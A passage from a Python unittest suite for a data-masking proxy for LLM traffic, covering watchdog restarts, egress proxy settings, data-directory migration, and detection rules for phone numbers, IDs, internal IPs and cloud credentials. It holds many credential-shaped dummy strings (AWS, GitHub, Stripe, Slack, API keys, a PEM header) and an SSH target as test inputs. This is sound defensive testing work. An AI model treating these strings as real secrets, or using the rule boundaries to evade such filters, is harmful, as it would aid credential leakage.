                                     "upstreams": [{"name": "t", "port": port,
                                                    "target": "https://example.com"}]}
        panel._stop_passthrough()
        self.assertEqual(panel._start_fallback("test"), 1)
        self.assertEqual(panel.state["fallback_mode"], "error")
        self.assertFalse(panel.state["passthrough"], "503 占位不是透传，不能显示明文直连")

        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
        conn.request("POST", "/v1/chat/completions",
                     body=json.dumps({"model": "gpt-4", "messages": []}),
                     headers={"Content-Type": "application/json"})
        resp = conn.getresponse()
        payload = json.loads(resp.read().decode("utf-8"))
        conn.close()
        self.assertEqual(resp.status, 503)
        self.assertEqual(payload["error"]["code"], "shield_unavailable")
        self.assertIn("Data Maskit", payload["error"]["message"])

    def test_watchdog_restarts_when_ports_down_though_process_alive(self):
        """进程活着但端口没了，watchdog 必须重启（连续 N 轮确认后）。

        此前 watchdog 只看 p.poll()：mitmdump 只绑上部分端口、或某个 listener
        运行中挂掉时完全无感，面板一直显示「运行中」而客户端连不上。
        """
        olds = {k: getattr(panel, k) for k in
                ("_listening_port_pids", "_expected_listen_ports", "_restart_proxy_locked",
                 "_emit_log")}
        old_sleep = panel.time.sleep
        self.addCleanup(lambda: [setattr(panel, k, v) for k, v in olds.items()])
        self.addCleanup(lambda: setattr(panel.time, "sleep", old_sleep))
        self.addCleanup(lambda: panel.state.update({"port_down_rounds": 0,
                                                    "stop_requested": False}))

        class AliveProc:
            def poll(self):
                return None

        restarts = []
        panel._emit_log = lambda line: None
        panel._expected_listen_ports = lambda *a, **kw: [18701, 18702]
        panel._listening_port_pids = lambda ports, fresh=False: {18701: {1}}  # 18702 失守
        panel._restart_proxy_locked = lambda reason: restarts.append(reason) or True
        panel.time.sleep = lambda s: None
        panel.proc["p"] = AliveProc()
        panel.state.update({"stop_requested": False, "generation": 77,
                            "capture_mode": "reverse", "port_down_rounds": 0})
        self.addCleanup(lambda: panel.proc.update({"p": None}))

        panel._watchdog(generation=77)
        self.assertEqual(len(restarts), 1, "端口持续失守必须触发重启")
        self.assertIn("18702", restarts[0])

    def test_watchdog_port_check_debounces_single_round(self):
        """单轮端口缺失不重启：可能是 netstat 偶发空结果或端口重绑瞬间。"""
        olds = {k: getattr(panel, k) for k in
                ("_listening_port_pids", "_expected_listen_ports", "_restart_proxy_locked",
                 "_emit_log")}
        old_sleep = panel.time.sleep
        self.addCleanup(lambda: [setattr(panel, k, v) for k, v in olds.items()])
        self.addCleanup(lambda: setattr(panel.time, "sleep", old_sleep))
        self.addCleanup(lambda: panel.state.update({"port_down_rounds": 0,
                                                    "stop_requested": False}))

        class AliveProc:
            def poll(self):
                return None

        restarts = []
        rounds = {"n": 0}

        def fake_sleep(_s):
            rounds["n"] += 1
            # sleep 在检测之前，这里置停止位可让循环只完成 1 轮检测就退出
            panel.state["stop_requested"] = True

        panel._emit_log = lambda line: None
        panel._expected_listen_ports = lambda *a, **kw: [18701]
        panel._listening_port_pids = lambda ports, fresh=False: {}
        panel._restart_proxy_locked = lambda reason: restarts.append(reason) or True
        panel.time.sleep = fake_sleep
        panel.proc["p"] = AliveProc()
        panel.state.update({"stop_requested": False, "generation": 78,
                            "capture_mode": "reverse", "port_down_rounds": 0})
        self.addCleanup(lambda: panel.proc.update({"p": None}))

        panel._watchdog(generation=78)
        self.assertEqual(restarts, [], "只确认 1 轮就重启会被瞬时抖动误伤")
        self.assertEqual(panel.state["port_down_rounds"], 1)

    def test_watchdog_keeps_guarding_after_restart_failure(self):
        """自动重启失败**不能**结束 watchdog 线程。

        曾在此 return：代理从此无人守护，叠加 stop_mode=block 就是永久断网，
        只能等用户自己发现并手动点启动。
        """
        olds = {k: getattr(panel, k) for k in
                ("start_proxy", "_start_fallback", "_dump_crash_context", "_emit_log",
                 "_sleep_interruptible", "_free_upstream_ports")}
        old_sleep = panel.time.sleep
        self.addCleanup(lambda: [setattr(panel, k, v) for k, v in olds.items()])
        self.addCleanup(lambda: setattr(panel.time, "sleep", old_sleep))
        self.addCleanup(lambda: panel.state.update({"stop_requested": False, "restarts": 0}))

        class DeadProc:
            def poll(self):
                return 1

        attempts = {"n": 0}

        def fake_start_proxy():
            attempts["n"] += 1
            panel.state["generation"] = panel.state.get("generation", 0) + 1  # 真实行为
            if attempts["n"] >= 3:
                panel.state["stop_requested"] = True  # 第 3 次后收工，避免测试死循环
                return True, None
            return False, "端口被占用"

        panel._emit_log = lambda line: None
        panel._dump_crash_context = lambda: None
        panel._start_fallback = lambda reason="": 0
        # 崩溃分支会调 _free_upstream_ports 清理残留——必须 mock，否则真实
        # netstat 扫描会杀掉正在运行的 LLM Shield 代理（实测发生过）。
        panel._free_upstream_ports = lambda: []
        panel.start_proxy = fake_start_proxy
        panel._sleep_interruptible = lambda seconds, generation: False
        panel.time.sleep = lambda s: None
        panel.proc["p"] = DeadProc()
        panel.state.update({"stop_requested": False, "generation": 88,
                            "capture_mode": "reverse", "restarts": 0,
                            "last_restart_ok_ts": 0})
        self.addCleanup(lambda: panel.proc.update({"p": None}))

        panel._watchdog(generation=88)
        self.assertGreaterEqual(attempts["n"], 3,
                                "重启失败后必须继续重试，而不是结束守护线程")

    def test_request_body_size_limit_blocks_oversized(self):
        """超大请求体一律拒绝：脱敏是 event loop 上的同步操作，会冻结所有连接。"""
        self.assertEqual(tr._MAX_REQUEST_BODY, 32 * 1024 * 1024)
        captured = []
        old_emit = tr._emit
        self.addCleanup(lambda: setattr(tr, "_emit", old_emit))
        tr._emit = lambda typ, **kw: captured.append((typ, kw))

        flow = SimpleNamespace(
            request=SimpleNamespace(
                method="POST", pretty_host="api.example.com", host="api.example.com",
                path="/v1/chat/completions",
                headers={"content-type": "application/json"},
                content=b'{"messages":[]}' + b"x" * (tr._MAX_REQUEST_BODY + 1),
            ),
            response=None, metadata={},
        )
        old_mode, old_filter = tr.CAPTURE_MODE, tr.FILTER_ENABLED
        old_target = tr.is_target
        old_reload = tr._maybe_reload
        self.addCleanup(lambda: setattr(tr, "CAPTURE_MODE", old_mode))
        self.addCleanup(lambda: setattr(tr, "FILTER_ENABLED", old_filter))
        self.addCleanup(lambda: setattr(tr, "is_target", old_target))
        self.addCleanup(lambda: setattr(tr, "_maybe_reload", old_reload))
        # request() 首行就是 _maybe_reload()，不挡住会用磁盘 config 覆盖下面的设定
        tr._maybe_reload = lambda force=False: None
        tr.CAPTURE_MODE = "explicit"
        tr.FILTER_ENABLED = True
        tr.is_target = lambda host, path: True

        tr.request(flow)
        self.assertIsNotNone(flow.response, "超限必须直接回响应，不能放行上行")
        self.assertEqual(flow.response.status_code, 413)
        blocks = [kw for typ, kw in captured if typ == "BLOCK"]
        self.assertTrue(blocks and blocks[0]["reason"] == "request_too_large")


class EgressProxyTests(unittest.TestCase):
    """出口代理（Shield → 上游方向）：v1.5.61 新增。

    背景：Codex 等客户端有些请求必须走代理才能出境，但客户端各自配代理既繁琐
    又不可能覆盖所有工具。Shield 在 reverse 模式下本就是全部 LLM 流量的必经之路，
    让它自己在转发上游时按 upstream 决定走不走代理，客户端零改动。
    """

    def test_parse_egress_proxy_accepts_http_forms(self):
        from shield_defaults import parse_egress_proxy as p
        self.assertEqual(p("http://127.0.0.1:7890"), ("http", ("127.0.0.1", 7890)))
        self.assertEqual(p("127.0.0.1:7890"), ("http", ("127.0.0.1", 7890)), "省略协议按 http")
        self.assertEqual(p("https://proxy.corp:8443"), ("https", ("proxy.corp", 8443)))
        self.assertEqual(p("https://proxy.corp"), ("https", ("proxy.corp", 443)), "https 默认 443")
        self.assertEqual(p("proxy.corp"), ("http", ("proxy.corp", 80)), "http 默认 80")
        self.assertEqual(p("http://[::1]:7890"), ("http", ("::1", 7890)), "IPv6 要能解析")
        self.assertEqual(p("http://127.0.0.1:7890/"), ("http", ("127.0.0.1", 7890)), "容忍尾部斜杠")

    def test_parse_egress_proxy_rejects_unsupported(self):
        """socks5 必须明确拒绝而不是静默忽略。

        mitmproxy 的 via 最终走 _upstream_proxy.py，那里硬断言 scheme 只能是
        http/https。静默忽略会变成「配了代理却仍直连」，比报错难查得多。
        """
        from shield_defaults import parse_egress_proxy as p
        for bad in ("socks5://127.0.0.1:1080", "socks://x:1", "", "   ", None,
                    "http://", "://x", "http://127.0.0.1:99999", "http://127.0.0.1:0"):
            self.assertIsNone(p(bad), f"{bad!r} 应判为非法")

    def test_normalize_config_warns_on_bad_egress(self):
        warns = []
        cfg = panel.normalize_config({"egress_proxy": {"enabled": True, "url": "socks5://127.0.0.1:1080"}}, warns)
        self.assertEqual(cfg["egress_proxy"], {"enabled": False, "url": ""},
                         "地址非法必须连带停用，不能留着一个用不了的开关")
        self.assertTrue(any("socks5" in w or "出口代理" in w for w in warns),
                        "必须给出 warning：静默丢弃会让用户以为配好了")

    def test_normalize_config_warns_when_enabled_but_nobody_uses(self):
        """配了代理却没有客户端勾选 use_proxy —— 看着「已启用」实际一条流量不走。"""
        warns = []
        cfg = panel.normalize_config({
            "egress_proxy": {"enabled": True, "url": "http://127.0.0.1:7890"},
            "upstreams": [{"name": "a", "base_path": "/a", "port": 18701,
                           "target": "https://api.example.com"}],
        }, warns)
        self.assertTrue(cfg["egress_proxy"]["enabled"])
        self.assertTrue(any("没有任何客户端" in w for w in warns), warns)

    def test_normalize_config_keeps_use_proxy_per_upstream(self):
        cfg = panel.normalize_config({
            "egress_proxy": {"enabled": True, "url": "http://127.0.0.1:7890"},
            "upstreams": [
                {"name": "cn", "base_path": "/cn", "port": 18701,
                 "target": "https://anyrouter.top", "use_proxy": False},
                {"name": "oai", "base_path": "/oai", "port": 18702,
                 "target": "https://api.openai.com", "use_proxy": True},
            ],
        })
        got = {u["name"]: u["use_proxy"] for u in cfg["upstreams"]}
        self.assertEqual(got, {"cn": False, "oai": True},
                         "走不走代理必须逐 upstream 保留：境内中转直连、境外走代理")

    def test_read_settings_resolves_egress_proxy(self):
        """引擎侧解析：关闭 / 地址非法 都要归一成 None，省得热路径判两个字段。"""
        old_root = tr._DATA_ROOT
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(lambda: setattr(tr, "_DATA_ROOT", old_root))
        try:
            tr._DATA_ROOT = tmp
            cases = [
                ({"enabled": True, "url": "http://127.0.0.1:7890"}, ("http", ("127.0.0.1", 7890))),
                ({"enabled": False, "url": "http://127.0.0.1:7890"}, None),
                ({"enabled": True, "url": "socks5://127.0.0.1:1080"}, None),
                ({"enabled": True, "url": ""}, None),
                (None, None),
            ]
            for raw, expect in cases:
                (tmp / "config.json").write_text(json.dumps({
                    "capture_mode": "reverse", "egress_proxy": raw,
                    "upstreams": [{"name": "a", "base_path": "/a", "port": 18701,
                                   "target": "https://x.example.com", "use_proxy": True}],
                }), encoding="utf-8")
                s = tr._read_settings()
                self.assertEqual(s.get("egress_proxy"), expect, f"raw={raw}")
                self.assertTrue(s["upstreams"][0]["use_proxy"], "use_proxy 必须传到引擎")
        finally:
            tr._DATA_ROOT = old_root

    def test_apply_egress_proxy_respects_use_proxy(self):
        """via 只挂在勾了 use_proxy 的 upstream 上，同进程内直连与代理并存。"""
        old = tr.EGRESS_PROXY
        self.addCleanup(lambda: setattr(tr, "EGRESS_PROXY", old))
        tr.EGRESS_PROXY = ("http", ("127.0.0.1", 7890))

        def mkflow():
            return SimpleNamespace(server_conn=SimpleNamespace(via=None), metadata={})

        f = mkflow()
        tr._apply_egress_proxy(f, {"name": "oai", "use_proxy": True})
        self.assertEqual(f.server_conn.via, ("http", ("127.0.0.1", 7890)))
        self.assertTrue(f.metadata.get("shield_via_proxy"))

        f = mkflow()
        tr._apply_egress_proxy(f, {"name": "cn", "use_proxy": False})
        self.assertIsNone(f.server_conn.via, "没勾的 upstream 必须保持直连")
        self.assertFalse(f.metadata.get("shield_via_proxy"))

        # 全局关闭时，即便 upstream 勾了也不挂
        tr.EGRESS_PROXY = None
        f = mkflow()
        tr._apply_egress_proxy(f, {"name": "oai", "use_proxy": True})
        self.assertIsNone(f.server_conn.via)

    def test_apply_egress_proxy_never_breaks_forwarding(self):
        """server_conn 不可写时只记日志，绝不让转发挂掉。"""
        old = tr.EGRESS_PROXY
        self.addCleanup(lambda: setattr(tr, "EGRESS_PROXY", old))
        tr.EGRESS_PROXY = ("http", ("127.0.0.1", 7890))

        class Frozen:
            @property
            def via(self):
                return None

            @via.setter
            def via(self, v):
                raise RuntimeError("read-only")

        flow = SimpleNamespace(server_conn=Frozen(), metadata={})
        tr._apply_egress_proxy(flow, {"name": "x", "use_proxy": True})  # 不得抛出
        self.assertFalse(flow.metadata.get("shield_via_proxy"))

    def test_error_event_marks_via_proxy(self):
        """走代理的请求失败时必须标出来：代理不通和上游不通现象一样，不标分不清。"""
        captured = []
        old_emit = tr._emit
        self.addCleanup(lambda: setattr(tr, "_emit", old_emit))
        tr._emit = lambda typ, **kw: captured.append((typ, kw))
        flow = SimpleNamespace(
            request=SimpleNamespace(host="api.openai.com", pretty_host="api.openai.com",
                                    path="/v1/chat/completions", method="POST"),
            metadata={"session_id": "eg01", "shield_via_proxy": True},
            error="ConnectionRefusedError",
        )
        tr.error(flow)
        self.assertTrue(captured)
        self.assertIn("via egress_proxy", captured[0][1]["msg"])


class DataRootCrossPlatformTests(unittest.TestCase):
    """更名 Maskit 后的数据目录：跨平台落点 + 老用户目录迁移（数据丢失级逻辑）。"""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(lambda: __import__("shutil").rmtree(self.tmp, ignore_errors=True))

    def _platform(self, name, env):
        """临时改 sys.platform 与相关环境变量（panel 在函数内实时读取）。"""
        old_plat = panel.sys.platform
        old_env = {k: os.environ.get(k) for k in ("APPDATA", "XDG_DATA_HOME", "HOME", "USERPROFILE")}
        old_home = Path.home

        def restore():
            panel.sys.platform = old_plat
            Path.home = old_home
            for k, v in old_env.items():
                if v is None:
                    os.environ.pop(k, None)
                else:
                    os.environ[k] = v

        self.addCleanup(restore)
        panel.sys.platform = name
        for k in ("APPDATA", "XDG_DATA_HOME"):
            os.environ.pop(k, None)
        os.environ.update(env)
        Path.home = staticmethod(lambda: self.tmp / "home")

    def test_windows_uses_appdata(self):
        self._platform("win32", {"APPDATA": str(self.tmp / "Roaming")})
        self.assertEqual(panel._default_data_root(), self.tmp / "Roaming" / "Maskit")

    def test_windows_falls_back_when_appdata_missing(self):
        """服务/精简环境下 %APPDATA% 可能没有：必须回退到 home 下的标准位置，不能崩。"""
        self._platform("win32", {})
        self.assertEqual(panel._default_data_root(),
                         self.tmp / "home" / "AppData" / "Roaming" / "Maskit")

    def test_macos_uses_application_support(self):
        self._platform("darwin", {})
        self.assertEqual(panel._default_data_root(),
                         self.tmp / "home" / "Library" / "Application Support" / "Maskit")

    def test_linux_respects_xdg_data_home(self):
        self._platform("linux", {"XDG_DATA_HOME": str(self.tmp / "xdg")})
        self.assertEqual(panel._default_data_root(), self.tmp / "xdg" / "maskit")

    def test_linux_default_is_local_share_lowercase(self):
        """XDG 惯例是全小写目录名，且缺省落 ~/.local/share，不是 ~/maskit。"""
        self._platform("linux", {})
        self.assertEqual(panel._default_data_root(),
                         self.tmp / "home" / ".local" / "share" / "maskit")

    def _make_legacy(self, name="LLMShield"):
        legacy = self.tmp / name
        (legacy / "sub").mkdir(parents=True)
        (legacy / "config.json").write_text('{"upstreams": []}', encoding="utf-8")
        (legacy / "shield-events.sqlite3").write_text("db", encoding="utf-8")
        (legacy / "sub" / "a.md").write_text("x", encoding="utf-8")
        return legacy

    def test_migrates_legacy_dir_contents(self):
        legacy = self._make_legacy()
        target = self.tmp / "Maskit"
        panel._migrate_legacy_data_root(target)
        self.assertTrue((target / "config.json").exists(), "配置必须搬过来")
        self.assertTrue((target / "shield-events.sqlite3").exists(), "历史事件库必须搬过来")
        self.assertTrue((target / "sub" / "a.md").exists(), "子目录必须整体搬过来")
        self.assertTrue((legacy / "MOVED.txt").exists(), "旧目录要留去向说明")

    def test_migrates_even_if_target_dir_already_created_by_shell(self):
        """Tauri 壳拉起引擎前就会往新目录写 engine-stdout.log。

        判据若用「目录不存在」，迁移永不触发，老用户数据被静默孤立——这条是回归闸门。
        """
        self._make_legacy()
        target = self.tmp / "Maskit"
        target.mkdir()
        (target / "engine-stdout.log").write_text("boot", encoding="utf-8")
        panel._migrate_legacy_data_root(target)
        self.assertTrue((target / "config.json").exists(), "壳已建目录时仍必须迁移")

    def test_migration_never_overwrites_existing(self):
        """新目录已有同名文件时一律保留新的，绝不被旧数据覆盖。"""
        self._make_legacy()
        target = self.tmp / "Maskit"
        target.mkdir()
        (target / "shield-events.sqlite3").write_text("NEW", encoding="utf-8")
        panel._migrate_legacy_data_root(target)
        self.assertEqual((target / "shield-events.sqlite3").read_text(encoding="utf-8"), "NEW")
        self.assertTrue((target / "config.json").exists())

    def test_migration_is_idempotent(self):
        """已迁移过（新目录有 config.json）再调用不得再动任何东西。"""
        self._make_legacy()
        target = self.tmp / "Maskit"
        panel._migrate_legacy_data_root(target)
        (target / "config.json").write_text('{"marker": 1}', encoding="utf-8")
        legacy2 = self._make_legacy("llmshield")
        panel._migrate_legacy_data_root(target)
        self.assertEqual((target / "config.json").read_text(encoding="utf-8"), '{"marker": 1}')
        self.assertTrue((legacy2 / "config.json").exists(), "第二个旧目录不应被吞掉")

    def test_no_legacy_dir_is_a_noop(self):
        """全新安装：没有旧目录，不得报错也不得凭空建东西。"""
        target = self.tmp / "Maskit"
        panel._migrate_legacy_data_root(target)
        self.assertFalse(target.exists())

    def test_legacy_without_config_is_not_migrated(self):
        """旧目录只剩空壳（无 config.json）时不迁移，避免把垃圾搬进新目录。"""
        legacy = self.tmp / "LLMShield"
        legacy.mkdir()
        (legacy / "engine-stdout.log").write_text("junk", encoding="utf-8")
        target = self.tmp / "Maskit"
        panel._migrate_legacy_data_root(target)
        self.assertFalse(target.exists())


class _RuleTestBase(unittest.TestCase):
    """规则类用例的公共夹具。

    单独抽出来是为了让下面几组各自继承它，而不是互相继承——曾经让新类直接继承
    BuiltinRuleVariantTests，结果父类的每条用例被重复收集执行 4 遍。
    """

    def setUp(self):
        tr.sessions.clear()
        tr._RECENT_FWD.clear()
        tr._RECENT_REV.clear()
        tr._RECENT_SUFFIX.clear()
        tr.CUSTOM_WORDS.clear()
        tr.SENSITIVE_DISABLED = set()
        tr.SENSITIVE_WORD_DISABLED = {}
        tr.BUILTIN_RULES = {l: True for l in tr.DEFAULT_BUILTIN_RULES}
        tr.BUILTIN_RULES["IP_INTERNAL"] = False
        tr.BUILTIN_RULES["USCC"] = False
        tr._CUSTOM_WORD_RX_CACHE.clear()
        self._sid = [0]

    def _labels(self, text):
        self._sid[0] += 1
        sid = "rulevar-%d" % self._sid[0]
        masked = tr.mask(text, sid)
        hits = (tr.sessions.get(sid) or {}).get("last_hits") or []
        labels = sorted({(h.get("label") if isinstance(h, dict) else str(h)) for h in hits})
        return masked, labels

    def assertMasked(self, text, why=""):
        masked, labels = self._labels(text)
        self.assertTrue(labels, f"应命中却漏检: {text!r} {why}")
        return masked, labels

    def assertUntouched(self, text, why=""):
        masked, labels = self._labels(text)
        self.assertEqual(labels, [], f"误报: {text!r} -> {labels} {why}")
        self.assertEqual(masked, text, "未命中时原文必须原样返回")


class BuiltinRuleVariantTests(_RuleTestBase):
    """内置规则的真实变体覆盖与误报边界（2026-08-15 探针实测后固化）。

    这一组的价值在「不该命中的必须不命中」：脱敏规则放宽一次，误伤面就永久扩大，
    用户体感是「模型看不懂我的版本号/订单号」，比漏检更难排查。
    """

    # ---- 手机号变体 ----
    def test_phone_variants_all_masked(self):
        for t in ["联系 13812345678", "联系 138-1234-5678", "联系 138 1234 5678",
                  "联系 +8613812345678", "联系 +86 138 1234 5678", "联系 +86-13812345678",
                  "联系 8613812345678"]:
            with self.subTest(t=t):
                self.assertMasked(t)

    def test_phone_like_numbers_not_masked(self):
        """86/13 开头的长数字串是订单号、时间戳、git sha 的常见形态，不能误伤。"""
        for t in ["ts=1755200000000", "count=13812345678901234", "seq 8612345678901234567",
                  "commit 8613812345678abcdef", "SKU-138123456789", "耗时 138.1234 ms"]:
            with self.subTest(t=t):
                self.assertUntouched(t)

    # ---- 赋值型凭据：配置块是真实泄漏主战场 ----
    def test_secret_in_quoted_config_forms(self):
        """用户粘 .env / JSON / YAML 配置块是最高频的凭据泄漏路径，键值两侧引号都要吃掉。"""
        for t in ['password="hunter2000"', '{"api_key": "sk1a2b3c4d5e6f"}',
                  '{"password":"Passw0rd123"}', "secret: 'Abc12345'",
                  "API_KEY=sk1a2b3c4d5e6f"]:
            with self.subTest(t=t):
                masked, _ = self.assertMasked(t)
                self.assertNotIn("hunter2000", masked)
                self.assertNotIn("Passw0rd123", masked)
                self.assertNotIn("sk1a2b3c4d5e6f", masked)

    def test_secret_quotes_are_not_swallowed(self):
        """引号只作边界不进捕获组：吞掉引号会破坏 JSON 结构，上游直接 400。"""
        masked, _ = self._labels('{"api_key": "sk1a2b3c4d5e6f"}')
        self.assertTrue(masked.startswith('{"api_key": "'), masked)
        self.assertTrue(masked.endswith('"}'), masked)
        self.assertEqual(json.loads(masked).get("api_key", "")[:2], "{{")

    def test_secret_false_positive_boundaries(self):
        """说明文案、方法名、纯字母值、已有占位符都不是凭据。"""
        for t in ["配置项 token=/path/to/file", "调用 ModelUtils.toStringSafe",
                  "password=abcdefgh", "请把 password 设置好",
                  "api_key={{APIKEY_a1b2c3}}"]:
            with self.subTest(t=t):
                self.assertUntouched(t)

    # ---- 其余核心规则的形态与边界 ----
    def test_pem_private_key_whole_block(self):
        pem = "\n".join([
            "-----BEGIN " + "RSA PRIVATE KEY-----",
            "MIIEowIBAAKCAQEAwXyz1234567890abcdefghijklmnopqrstuvwxyz",
            "-----END " + "RSA PRIVATE KEY-----",
        ])
        masked, labels = self.assertMasked(pem)
        self.assertIn("PRIVATE", "".join(labels) + masked)
        self.assertNotIn("MIIEow", masked, "私钥正文必须整块替换")

    def test_luhn_gate_on_card(self):
        """卡号必须过 Luhn：不过 Luhn 的长数字串是订单号/流水号，误伤代价高。"""
        self.assertMasked("卡号 4111111111111111")
        self.assertUntouched("流水 4111111111111112")

    def test_version_number_not_masked_as_ip(self):
        """10.x 是最常见版本号形态，IP_INTERNAL 默认关，不得误伤。"""
        self.assertUntouched("升级到 10.2.3.4 版本")

    def test_idcard18_requires_checksum(self):
        self.assertMasked("证件 110101199003078515")
        self.assertUntouched("订单 202601151234567")


class CloudCredentialCoverageTests(_RuleTestBase):
    """云厂商凭据形态覆盖（2026-08-15 按厂商文档逐条实测后补齐）。

    官网「密钥形态识别」点名了 GitHub / AWS / Google / 阿里云 / 腾讯云 / Stripe /
    Slack / 飞书 / 钉钉。照真实长度打过去发现三个漏：腾讯云 SecretId 规则上界比
    真实长度短、GitHub 新版 fine-grained PAT 没有规则、AWS SecretAccessKey
    （能直接花钱的那半）整个没覆盖。这组用例把真实长度钉死，防止以后再按
    「大概多长」写边界。
    """

    def test_tencent_secret_id_real_length(self):
        """腾讯云 SecretId = AKID + 32 位。原规则上界 20，真实串恒不命中。"""
        t1 = "AKID" + "TESTONLYabcdefghijklmnopqrstuvwx"
        t2 = "AKID" + "1234567890abcdefghijklmnopqrstuv"
        for t in [t1, t2]:
            with self.subTest(t=t):
                self.assertEqual(len(t), 36, "腾讯云 SecretId 就是 36 位，用例写错了")
                self.assertMasked(t)

    def test_tencent_prefix_alone_not_masked(self):
        """只有前缀没有足够长度的不算凭据，否则 AKID 开头的普通标识符全遭殃。"""
        for t in ["AKIDShort", "AKID12", "AKID"]:
            with self.subTest(t=t):
                self.assertUntouched(t)

    def test_github_fine_grained_pat(self):
        """github_pat_ 是 2022 GA 的新形态，ghp_ 规则匹配不到它。"""
        self.assertMasked("github_pat_11ABCDEFG0abcdefghij_1234567890abcdefghijklmnopqrstuvwxyzAB")

    def test_github_classic_pat_still_masked(self):
        self.assertMasked("ghp_" + "1234567890abcdefghijklmnopqrstuvwx")

    def test_github_lookalike_identifier_not_masked(self):
        for t in ["github_pat_tooshort", "import github_pattern_matcher"]:
            with self.subTest(t=t):
                self.assertUntouched(t)

    AWS_SK = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"  # AWS 文档里的公开示例值

    def test_aws_secret_access_key_keyed_forms(self):
        """env / YAML / JSON / 驼峰四种写法都要认；泄漏这半边才是能直接花钱的。"""
        for t in ["aws_secret_access_key=" + self.AWS_SK,
                  "aws_secret_access_key = " + self.AWS_SK,
                  "AWS_SECRET_ACCESS_KEY=" + self.AWS_SK,
                  "awsSecretAccessKey: " + self.AWS_SK,
                  '{"aws_secret_access_key": "%s"}' % self.AWS_SK,
                  "aws-secret-access-key: " + self.AWS_SK]:
            with self.subTest(t=t):
                masked, _ = self.assertMasked(t)
                self.assertNotIn(self.AWS_SK, masked, "密钥本体必须被替换掉")

    def test_aws_secret_bare_string_deliberately_ignored(self):
        """裸 40 位 base64 故意放过：任何摘要都长这样，误报代价大于漏检。"""
        self.assertUntouched(self.AWS_SK)

    def test_aws_key_name_without_value_not_masked(self):
        self.assertUntouched("aws_secret_access_key 这个环境变量要配一下")

    def test_aws_access_key_id_still_masked(self):
        self.assertMasked("AWS_ACCESS_KEY_ID=" + "AKIA" + "IOSFODNN7EXAMPLE")

    def test_other_vendors_regression(self):
        """改上面几条规则时别把其余厂商碰坏。"""
        stripe_live = "sk_" + "live_" + "51Abcdefghijklmnopqrstuvw"
        stripe_rk = "rk_" + "live_" + "51Abcdefghijklmnopqrstuvw"
        slack_xoxb = "xox" + "b-1234567890-abcdefghij"
        google_ak = "AIza" + "SyBOTI4_1234567890abcdefghijklmnopq"
        for t in [google_ak,
                  "LTAI5tabcdefghijklmnopqr",
                  stripe_live,
                  stripe_rk,
                  slack_xoxb,
                  "cli_a1b2c3d4e5f6g7h8",
                  "dingabcdefghij1234567",
                  "sk-proj-9f3aK2mQxxxxYYYY1234abcdEFGH",
                  "sk-ant-api03-abcdefGHIJ1234567890xyz"]:
            with self.subTest(t=t):
                self.assertMasked(t)

    def test_base64_and_hash_not_masked(self):
        """加了 AWS 规则后最怕的就是把摘要 / base64 当密钥。"""
        for t in ["sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                  "base64: aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxkaGVsbG8=",
                  "AWS_REGION=us-east-1"]:
            with self.subTest(t=t):
                self.assertUntouched(t)


class InternalIpCoverageTests(_RuleTestBase):
    """内网 IP 段覆盖（2026-08-15 实测缺口后补）。

    起因：`ssh tanmw@100.118.224.56` 原文直出。100.64.0.0/10 是 CGNAT 段，
    Tailscale / ZeroTier / 运营商大内网全用它——对用户来说这就是内网地址，
    但三条 IP 规则一条都不覆盖它。顺带修了共有的右边界缺陷：
    `编号 192.168.1.1.1` 会被截掉前 4 段打码，剩个 `.1` 挂在后面。
    """

    def test_cgnat_range_masked(self):
        for t in ["ssh tanmw@100.118.224.56", "100.64.0.1", "100.127.255.254",
                  "连 100.100.1.5 试试"]:
            with self.subTest(t=t):
                self.assertMasked(t)

    def test_outside_cgnat_range_untouched(self):
        """第二段必须落在 64-127；否则 100.x 开头的普通数字串全遭殃。"""
        for t in ["100.0.0.1", "100.63.0.1", "100.128.0.1", "100.200.1.1"]:
            with self.subTest(t=t):
                self.assertUntouched(t)

    def test_decimal_lookalikes_untouched(self):
        for t in ["覆盖率 100.65 分", "价格 100.70 元", "进度 100.99%", "v100.64.1.2-beta"]:
            with self.subTest(t=t):
                self.assertUntouched(t)

    def test_five_octet_sequence_untouched(self):
        """5 段不是 IPv4。原右边界只挡字母数字，会把前 4 段吃掉留个 .1 的尾巴。"""
        for t in ["编号 100.64.0.0.1", "编号 192.168.1.1.1", "编号 169.254.1.1.1"]:
            with self.subTest(t=t):
                self.assertUntouched(t)

    def test_existing_private_ranges_still_masked(self):
        for t in ["ssh tanmw@192.168.1.6", "169.254.1.1", "IP 是 192.168.1.1。"]:
            with self.subTest(t=t):
                self.assertMasked(t)

    def test_wildcard_dns_host_still_masked(self):
        """192.168.1.1.nip.io 这类泛解析域名里的 IP 仍要打码（后面跟的是字母不是数字）。"""
        masked, _ = self.assertMasked("主机 192.168.1.1.nip.io")
        self.assertIn(".nip.io", masked, "域名后缀不该被吃掉")

    def test_rfc1918_ranges_remain_default_off(self):
        """10.x / 172.16-31.x 默认关是有意的（撞版本号），别顺手打开。"""
        tr.BUILTIN_RULES = dict(tr.DEFAULT_BUILTIN_RULES)
        self.assertFalse(tr.DEFAULT_BUILTIN_RULES["IP_INTERNAL"])
        for t in ["ssh tanmw@10.0.0.5", "ssh tanmw@172.24.0.1"]:
            with self.subTest(t=t):
                self.assertUntouched(t)


class PlaceholderPollutionTests(_RuleTestBase):
    """占位符防污染：上一轮的占位符会原样回到下一轮请求体里。

    自定义词若含 hex 子串（'ab'）或恰好等于 label 名（'PHONE'），朴素替换会把
    占位符劈开 → 畸形占位符 → _PLACEHOLDER_RX 匹配不到 → 该项永久还原失败，
    用户看到的是回复里裸奔的 {{PHONE_ 垃圾。三个阶段（前缀 / 自定义词 /
    内置规则）都必须绕开占位符。
    """

    def test_masked_history_is_byte_identical(self):
        """整段只含占位符时，再脱敏一次必须逐字节不变，且不产生任何新映射。"""
        labels = sorted({l for _, l, _ in tr.RULES})
        tr.BUILTIN_RULES = {l: True for l in labels}
        hist = " ".join("{{%s_0123ab}}" % l[:12] for l in labels)
        sid = "pp-hist"
        tr._new_session(sid)
        self.assertEqual(tr.mask(hist, sid), hist)
        self.assertEqual(tr.sessions[sid]["fwd"], {}, "占位符内部不该被当成新的敏感项")

    def test_hex_custom_word_does_not_split_placeholder(self):
        tr.CUSTOM_WORDS.update({"ab": "TERM"})
        tr._CUSTOM_WORD_RX_CACHE.clear()
